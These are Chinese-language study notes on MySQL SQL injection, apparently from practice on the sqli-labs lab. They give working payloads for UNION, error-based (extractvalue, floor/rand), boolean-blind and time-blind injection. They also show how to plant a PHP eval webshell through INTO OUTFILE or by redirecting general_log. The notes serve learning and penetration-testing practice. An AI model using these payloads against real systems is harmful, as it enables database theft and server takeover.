## 顺序

1. 判断注入是否存在
2. 判断类型（字符/数字）
3. fuzz 看一下有没有waf过滤/校验
4. 确定字段数 ORDER BY
5. 判断回显位 UNION SELECT 
6. 爆库名 把回显位换成database()
7. 爆表名 用information_schema.tables 表查，用group_concat()把所有表名拼在一起显示
8. 爆user表

## 闭合方式

通过看报错信息

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') and password=('') LIMIT 0,1' at line 1

MySQL 在报语法错误时，会习惯性地用一对单引号 `' ... '` 把出错的那段代码包起来。取出来就是

```
'1'') and password=('') LIMIT 0,1
```



- '$id'

- ('$id')
- ("$id")
- (('$id'))

## information_schema库

核心三张表及其主要字段

- schemata  - 库名
  - schema_name - 库名
- tables- 库下表名
  - table_name 具体的表名
  - table_schema - 表对应的库名
- columns - 所有表的详细字段（列）信息
  - column_name - 列名
  - table_schema - 库名
  - table_name - 表名

## 双查询报错注入

### payload1

```sql
AND extractvalue(1, concat(0x7e, database())) --+
```

```sql
AND 
extractvalue(
    1,                                  -- 参数1：目标XML文档（随便写个1占位）
    CONCAT(                             -- 参数2：目标XPath路径（制造格式错误的案发现场）
        0x7e,                           -- 视觉分隔符（波浪号 ~），用于触发报错并分隔数据
        SUBSTR(                         -- 安全阀：防止数据超过32字符被无声截断
            (
                SELECT group_concat(table_name)   -- 核心收割机：把查到的多行表名揉成一行
                FROM information_schema.tables 
                WHERE table_schema=database()     -- 精准定位：只查当前数据库的表
            ), 
            1, 30                       -- 截取指令：每次只拿 30 个字符（下次改为 31, 30）
        )
    )
) --+
```



### payload2

```sql
 AND 
(
    SELECT 1 FROM 
    (
        SELECT count(*), 
               concat(
                   (SELECT database()), 
                   floor(rand(0)*2)
               ) AS x 
        FROM information_schema.tables 
        GROUP BY x
    ) AS a
)--+
```

拆分

1. 第一层

   ```
    ?id=1' AND (...) --+
   ```

2. 第二层

   ```
   SELECT 1 FROM ( ...内部核心... ) AS a
   ```

   需要有这层，是因为AND后面接的子查询，只允许有一行一列。通过这句不报错，来执行内部的核心语句（第三层）

3. 第三层（核心）

   ```
   SELECT count(*), ... FROM information_schema.tables GROUP BY x
   ```

   - `FROM information_schema.tables` “垫脚石”表，触发报警bug至少需要3行数据，该表足够多
   - `GROUP BY x 强制建立一张虚拟表，并把x（会重复）作为主键`
   - `count(*)配合group by`

4. 第四层

   ```
   concat( (SELECT database()) , floor(rand(0)*2) ) AS x
   ```

   重复主键，触发报错

## 全局变量（@@）

用`@@`读，用`GLOBAL`写

1. `datadir`数据目录

2. `basedir`MySQL的安装目录

3. `version_compile_os` 操作系统类型（决定写路径的时候用`/`还是`\\`）

4. `hostname`主机名

5. `secure_file_priv`是否能读写文件，取值如下

   - `NULL` 最安全，彻底

   - 特定路径，如`"/var/lib/mysql-files/"`可写入该路径

   - `""`（空字符串）最危险

​	决定了`INTO OUTFILE`和`LOAD DATA INFILE`是否能用

`UNION SELECT 1, 2, '<?php @eval($_POST["yb"]);?>' INTO OUTFILE 'C:/phpStudy/WWW/sqli-labs/shell.php'`

6. `@@general_log`全局日志开关

​       `@@general_log_file`全局日志存储路径

​	日志写马：

​	```SET GLOBAL general_log = 'on'; ```

​	```SET GLOBAL general_log_file = 'C:/phpStudy/www/shell.php';```

​	```SELECT '<?php @eval($_POST["cmd"]); ?>';```

## 盲注

### 布尔盲注

`length()`

`substr(str, index, len)` 从`index`开始算起的`len`的长度，**index从1开始，不是0**，

二分加速，例：`AND (substr(database(),1,1)>'s')``AND length(database()>2)`

### 时间盲注

`AND IF(database()='secudrity', SLEEP(5), 0)`

`AND IF( length(database())=8, SLEEP(5), 0 )`

`AND IF( ascii(substr(database(),1,1))=115, SLEEP(5), 0 )`

## 其他

1. ASC/DESC 仅能跟在 ORDER BY/GROUP BY 等排序子句后
2. 固定顺序 SELECT → FROM → WHERE → GROUP BY → ORDER BY → LIMIT
3. **Oracle、SQL Server、PostgreSQL** ：不支持直接 `OR 1`，会报语法错误或类型不匹配；所以建议 OR 1=1
4. 判断注入是否存在，一般用 单引号
5. 登陆框注入时，一般用尝试 `#` 注释
